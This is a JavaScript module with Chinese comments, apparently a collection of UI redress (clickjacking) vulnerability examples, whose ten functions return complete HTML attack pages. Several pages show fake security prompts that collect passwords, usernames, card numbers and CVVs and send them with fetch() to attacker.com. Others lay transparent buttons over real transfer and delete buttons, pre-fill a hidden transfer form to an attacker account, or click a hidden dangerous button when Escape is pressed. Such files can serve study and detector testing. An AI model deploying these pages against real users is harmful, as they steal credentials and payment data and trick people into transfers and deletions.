// UI Redress 漏洞示例文件

// 示例 1: 基本的 UI Redress 攻击
export function uiRedressExample1() {
  // 危险：基本的 UI 重绘攻击
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>UI Redress Attack - Example 1</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          font-family: Arial, sans-serif;
        }
        
        .overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 9999;
          pointer-events: none; /* 允许点击穿透到下层 */
        }
        
        .fake-ui {
          position: absolute;
          top: 100px;
          left: 100px;
          background: white;
          border: 2px solid #ccc;
          padding: 20px;
          box-shadow: 0 0 10px rgba(0,0,0,0.5);
          pointer-events: auto; /* 恢复当前元素的交互 */
        }
      </style>
    </head>
    <body>
      <h1>真实的网站内容</h1>
      <p>这是真实的网站内容，但会被 UI 重绘攻击掩盖</p>
      
      <!-- 真实的敏感操作按钮 -->
      <button id="realDeleteBtn" style="position: absolute; top: 300px; left: 300px; opacity: 0.1;">真实删除按钮</button>
      
      <div class="overlay">
        <div class="fake-ui">
          <h2>重要安全提醒</h2>
          <p>检测到账户异常，请立即验证身份：</p>
          <input type="password" id="fakePassword" placeholder="请输入您的密码">
          <button id="fakeVerifyBtn">验证身份</button>
          <p style="font-size: 12px; color: gray;">为了您的账户安全，请输入密码</p>
        </div>
      </div>
      
      <script>
        document.getElementById('fakeVerifyBtn').addEventListener('click', function() {
          const password = document.getElementById('fakePassword').value;
          // 将密码发送到攻击者服务器
          fetch('https://attacker.com/steal-password', {
            method: 'POST',
            body: JSON.stringify({password: password}),
            headers: {'Content-Type': 'application/json'}
          });
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 2: 表单劫持的 UI Redress
export function uiRedressExample2() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>UI Redress Attack - Example 2</title>
      <style>
        .transparent-overlay {
          position: fixed;
          top: 250px;
          left: 250px;
          width: 300px;
          height: 200px;
          background: transparent;
          z-index: 1000;
          pointer-events: none;
        }
        
        .fake-form {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          background: white;
          border: 2px solid #4CAF50;
          padding: 15px;
          border-radius: 5px;
        }
      </style>
    </head>
    <body>
      <h1>正常网站页面</h1>
      <p>一些正常的网站内容...</p>
      
      <!-- 真实的表单（被遮挡） -->
      <form action="/real-transfer" method="POST" style="position: absolute; top: 250px; left: 250px; opacity: 0.05;">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="toAccount" value="attacker_account">
        <button type="submit">真实转账按钮</button>
      </form>
      
      <div class="transparent-overlay">
        <div class="fake-form">
          <h3>恭喜中奖！</h3>
          <p>您获得了 1000 元奖金！</p>
          <input type="text" placeholder="姓名">
          <input type="tel" placeholder="手机号">
          <button>立即领取</button>
        </div>
      </div>
    </body>
    </html>
  `;
}

// 示例 3: 按钮位置欺骗
export function uiRedressExample3() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>UI Redress Attack - Example 3</title>
      <style>
        .button-overlay {
          position: absolute;
          top: 350px;
          left: 150px;
          width: 120px;
          height: 40px;
          background: rgba(0,255,0,0.3);
          z-index: 999;
          pointer-events: none;
        }
        
        .misleading-text {
          position: absolute;
          top: 320px;
          left: 150px;
          z-index: 1000;
          background: white;
          padding: 5px;
          border: 1px solid black;
        }
      </style>
    </head>
    <body>
      <h1>银行网站</h1>
      <p>账户余额：¥10,000.00</p>
      
      <!-- 真实的取消订阅按钮 -->
      <button id="realUnsubscribe" style="position: absolute; top: 350px; left: 150px;">取消订阅</button>
      
      <!-- 误导性的覆盖层 -->
      <div class="misleading-text">点击确认安全</div>
      <div class="button-overlay"></div>
      
      <script>
        // 当用户点击绿色半透明区域时，实际上点击的是底层的真实按钮
        document.addEventListener('click', function(e) {
          console.log('用户点击了:', e.target);
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 4: 复杂的 UI 重绘攻击
export function uiRedressExample4() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>UI Redress Attack - Example 4</title>
      <style>
        .multi-layer-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 9998;
        }
        
        .layer-1 {
          position: absolute;
          top: 100px;
          left: 100px;
          width: 400px;
          height: 300px;
          background: rgba(255,255,255,0.9);
          border: 2px solid red;
          pointer-events: none;
        }
        
        .layer-2 {
          position: absolute;
          top: 120px;
          left: 120px;
          width: 360px;
          height: 260px;
          background: white;
          border: 1px solid blue;
          pointer-events: auto;
        }
        
        .fake-security {
          padding: 20px;
          text-align: center;
        }
      </style>
    </head>
    <body>
      <h1>电子商务网站</h1>
      <div class="product">商品：笔记本电脑 ¥5999</div>
      <button id="realBuy" style="position: absolute; top: 200px; left: 200px;">购买商品</button>
      
      <div class="multi-layer-overlay">
        <div class="layer-1">
          <div class="layer-2">
            <div class="fake-security">
              <h3>安全检查</h3>
              <p>检测到风险操作，请输入验证码：</p>
              <input type="text" id="captcha" placeholder="输入验证码">
              <button id="verifyBtn">验证</button>
              <p style="color: red; font-size: 12px;">验证后才能继续购物</p>
            </div>
          </div>
        </div>
      </div>
      
      <script>
        document.getElementById('verifyBtn').addEventListener('click', function() {
          const captcha = document.getElementById('captcha').value;
          // 验证码可能被用来实施进一步攻击
          alert('验证码已提交，请等待验证...');
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 5: 移动端 UI Redress
export function uiRedressExample5() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Mobile UI Redress Attack</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        .mobile-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 9999;
          background: rgba(255,255,255,0.8);
          display: flex;
          justify-content: center;
          align-items: center;
          pointer-events: none;
        }
        
        .mobile-popup {
          background: white;
          padding: 20px;
          border-radius: 10px;
          text-align: center;
          max-width: 80%;
          pointer-events: auto;
        }
        
        .mobile-btn {
          padding: 15px;
          font-size: 18px;
          margin: 10px;
        }
      </style>
    </head>
    <body>
      <h1>移动银行应用</h1>
      <button id="realTransfer" style="position: absolute; top: 200px; left: 50%; transform: translateX(-50%);">转账</button>
      
      <div class="mobile-overlay">
        <div class="mobile-popup">
          <h3>紧急安全更新</h3>
          <p>检测到安全威胁，请立即更新应用</p>
          <button class="mobile-btn" id="fakeUpdate">立即更新</button>
          <p style="font-size: 12px; color: gray;">点击更新按钮保证账户安全</p>
        </div>
      </div>
      
      <script>
        document.getElementById('fakeUpdate').addEventListener('click', function() {
          // 模拟更新操作，实际上可能是恶意操作
          alert('正在下载更新...');
          // 这里可能下载恶意软件
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 6: 多步骤 UI Redress
export function uiRedressExample6() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Multi-step UI Redress Attack</title>
      <style>
        .step-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 9999;
          background: rgba(0,0,0,0.5);
          display: flex;
          justify-content: center;
          align-items: center;
          pointer-events: none;
        }
        
        .step-modal {
          background: white;
          padding: 30px;
          border-radius: 10px;
          width: 80%;
          max-width: 500px;
          pointer-events: auto;
        }
      </style>
    </head>
    <body>
      <h1>在线服务</h1>
      <button id="realSettings" style="position: absolute; top: 150px; left: 150px;">设置</button>
      
      <div id="step1" class="step-overlay">
        <div class="step-modal">
          <h3>安全验证</h3>
          <p>第一步：输入用户名</p>
          <input type="text" id="username" placeholder="用户名">
          <button id="nextStep1">下一步</button>
        </div>
      </div>
      
      <div id="step2" class="step-overlay" style="display: none;">
        <div class="step-modal">
          <h3>安全验证</h3>
          <p>第二步：输入密码</p>
          <input type="password" id="password" placeholder="密码">
          <button id="nextStep2">下一步</button>
        </div>
      </div>
      
      <div id="step3" class="step-overlay" style="display: none;">
        <div class="step-modal">
          <h3>安全验证</h3>
          <p>第三步：输入银行卡信息</p>
          <input type="text" id="cardNumber" placeholder="卡号">
          <input type="text" id="cvv" placeholder="CVV">
          <button id="completeVerify">完成验证</button>
        </div>
      </div>
      
      <script>
        document.getElementById('nextStep1').addEventListener('click', function() {
          document.getElementById('step1').style.display = 'none';
          document.getElementById('step2').style.display = 'flex';
        });
        
        document.getElementById('nextStep2').addEventListener('click', function() {
          document.getElementById('step2').style.display = 'none';
          document.getElementById('step3').style.display = 'flex';
        });
        
        document.getElementById('completeVerify').addEventListener('click', function() {
          // 收集所有输入的信息
          const data = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            cardNumber: document.getElementById('cardNumber').value,
            cvv: document.getElementById('cvv').value
          };
          
          // 发送到攻击者服务器
          fetch('https://attacker.com/collect-data', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {'Content-Type': 'application/json'}
          });
          
          alert('验证完成！');
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 7: 动态 UI Redress
export function uiRedressExample7() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Dynamic UI Redress Attack</title>
      <style>
        .dynamic-overlay {
          position: fixed;
          z-index: 9999;
          pointer-events: none;
        }
        
        .dynamic-fake {
          background: white;
          border: 2px solid orange;
          padding: 15px;
          pointer-events: auto;
        }
      </style>
    </head>
    <body>
      <h1>动态 UI Redress 示例</h1>
      <button id="realAction" style="position: absolute; top: 250px; left: 250px;">真实操作</button>
      
      <script>
        // 动态创建 UI 重绘元素
        function createFakeUI() {
          const overlay = document.createElement('div');
          overlay.className = 'dynamic-overlay';
          overlay.style.top = '230px';
          overlay.style.left = '230px';
          overlay.style.width = '100px';
          overlay.style.height = '50px';
          
          const fakeElement = document.createElement('div');
          fakeElement.className = 'dynamic-fake';
          fakeElement.innerHTML = '<p>点击确认</p>';
          
          overlay.appendChild(fakeElement);
          document.body.appendChild(overlay);
        }
        
        // 延迟创建假 UI 元素
        setTimeout(createFakeUI, 3000);
      </script>
    </body>
    </html>
  `;
}

// 示例 8: 拖拽相关的 UI Redress
export function uiRedressExample8() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Drag-related UI Redress Attack</title>
      <style>
        .drag-overlay {
          position: fixed;
          top: 300px;
          left: 100px;
          width: 200px;
          height: 100px;
          background: rgba(255,255,0,0.3);
          z-index: 999;
          pointer-events: none;
        }
        
        .drag-instruction {
          position: absolute;
          top: 280px;
          left: 100px;
          z-index: 1000;
          background: white;
          padding: 5px;
          border: 1px solid black;
        }
      </style>
    </head>
    <body>
      <h1>文件管理系统</h1>
      
      <!-- 真实的危险操作按钮 -->
      <button id="realDeleteAll" style="position: absolute; top: 300px; left: 100px;">删除所有文件</button>
      
      <div class="drag-instruction">请拖拽文件到此处上传</div>
      <div class="drag-overlay"></div>
      
      <script>
        // 当用户尝试"拖拽"时，实际上触发了危险操作
        document.addEventListener('dragover', function(e) {
          e.preventDefault();
        });
        
        document.addEventListener('drop', function(e) {
          e.preventDefault();
          alert('文件上传功能暂不可用');
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 9: 键盘事件相关的 UI Redress
export function uiRedressExample9() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Keyboard-related UI Redress Attack</title>
    </head>
    <body>
      <h1>键盘事件 UI Redress</h1>
      <p>按 ESC 键退出全屏模式</p>
      
      <button id="realDangerousAction" style="position: absolute; top: 200px; left: 200px; opacity: 0.01;">危险操作</button>
      
      <script>
        // 监听键盘事件，当用户按ESC时，触发真实按钮点击
        document.addEventListener('keydown', function(e) {
          if (e.key === 'Escape') {
            // 模拟点击真实危险按钮
            document.getElementById('realDangerousAction').click();
            alert('已退出全屏模式');
          }
        });
        
        document.getElementById('realDangerousAction').addEventListener('click', function() {
          // 危险操作
          console.log('危险操作被触发！');
        });
      </script>
    </body>
    </html>
  `;
}

// 示例 10: 复合 UI Redress 攻击
export function uiRedressExample10() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Composite UI Redress Attack</title>
      <style>
        body {
          margin: 0;
          padding: 20px;
          font-family: Arial, sans-serif;
        }
        
        /* 技术1: 固定覆盖层 */
        .fixed-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 9995;
          pointer-events: none;
        }
        
        /* 技术2: 多层覆盖 */
        .layer-1 {
          position: absolute;
          top: 50px;
          left: 50px;
          width: 90%;
          height: 90%;
          background: rgba(255,255,255,0.9);
          border: 2px solid red;
          pointer-events: none;
        }
        
        .layer-2 {
          position: absolute;
          top: 70px;
          left: 70px;
          width: 85%;
          height: 85%;
          background: white;
          border: 1px solid blue;
          pointer-events: auto;
        }
        
        /* 技术3: 误导性界面 */
        .fake-interface {
          padding: 20px;
          text-align: center;
        }
        
        /* 技术4: 透明按钮覆盖 */
        .transparent-btn {
          position: absolute;
          width: 120px;
          height: 40px;
          background: transparent;
          border: none;
          cursor: pointer;
          pointer-events: auto;
        }
        
        /* 技术5: 动态内容加载 */
        .dynamic-content {
          margin-top: 20px;
          padding: 10px;
          background: #f0f0f0;
        }
      </style>
    </head>
    <body>
      <h1>复合 UI Redress 攻击演示</h1>
      <p>这是一个正常的网页，但被多层 UI Redress 攻击覆盖</p>
      
      <!-- 真实的关键操作按钮 -->
      <button id="realConfirm" style="position: absolute; top: 200px; left: 200px; opacity: 0.05;">确认操作</button>
      <button id="realTransfer" style="position: absolute; top: 250px; left: 250px; opacity: 0.05;">转账</button>
      <button id="realDelete" style="position: absolute; top: 300px; left: 300px; opacity: 0.05;">删除账户</button>
      
      <!-- 复合 UI Redress 结构 -->
      <div class="fixed-overlay">
        <!-- 第一层覆盖 -->
        <div class="layer-1">
          <!-- 第二层覆盖，包含虚假界面 -->
          <div class="layer-2">
            <div class="fake-interface">
              <h2>系统安全中心</h2>
              <p>检测到异常活动，请立即验证您的身份</p>
              
              <div class="credentials-input">
                <input type="text" id="fakeUsername" placeholder="用户名">
                <input type="password" id="fakePassword" placeholder="密码">
              </div>
              
              <button id="fakeLogin">登录验证</button>
              
              <div class="dynamic-content" id="dynamicSection">
                <p>正在检查您的设备安全性...</p>
                <div class="progress-bar">██████░░░░ 60%</div>
              </div>
              
              <div style="margin-top: 15px; font-size: 12px; color: gray;">
                本次验证不会产生任何费用
              </div>
            </div>
            
            <!-- 技术4: 透明按钮覆盖真实按钮 -->
            <button class="transparent-btn" style="top: 200px; left: 200px;" id="overlayConfirm"></button>
            <button class="transparent-btn" style="top: 250px; left: 250px;" id="overlayTransfer"></button>
            <button class="transparent-btn" style="top: 300px; left: 300px;" id="overlayDelete"></button>
          </div>
        </div>
      </div>
      
      <script>
        // 技术5: 动态内容加载
        setTimeout(() => {
          document.getElementById('dynamicSection').innerHTML = `
            <p>发现高风险项目，需要立即处理</p>
            <button id="urgentAction">立即处理 (高优先级)</button>
            <p style="font-size: 10px; color: red;">系统将在10秒后自动执行操作</p>
          `;
        }, 5000);
        
        // 技术6: 多种事件处理
        document.getElementById('fakeLogin').addEventListener('click', function() {
          const credentials = {
            username: document.getElementById('fakeUsername').value,
            password: document.getElementById('fakePassword').value,
            timestamp: new Date().toISOString()
          };
          
          // 发送凭据到攻击者服务器
          fetch('https://attacker.com/credentials', {
            method: 'POST',
            body: JSON.stringify(credentials),
            headers: {'Content-Type': 'application/json'}
          });
        });
        
        // 处理覆盖按钮点击
        document.getElementById('overlayConfirm').addEventListener('click', function() {
          console.log('覆盖确认按钮被点击');
        });
        
        document.getElementById('overlayTransfer').addEventListener('click', function() {
          console.log('覆盖转账按钮被点击');
        });
        
        document.getElementById('overlayDelete').addEventListener('click', function() {
          console.log('覆盖删除按钮被点击');
        });
        
        // 技术7: 监控真实按钮状态
        setInterval(() => {
          const realButtons = document.querySelectorAll('#realConfirm, #realTransfer, #realDelete');
          realButtons.forEach(btn => {
            if (btn.offsetParent !== null) {
              console.log('真实按钮可见:', btn.id);
            }
          });
        }, 1000);
        
        // 技术8: 响应式调整覆盖层
        window.addEventListener('resize', function() {
          console.log('窗口大小改变，覆盖层需要调整');
        });
      </script>
    </body>
    </html>
  `;
}
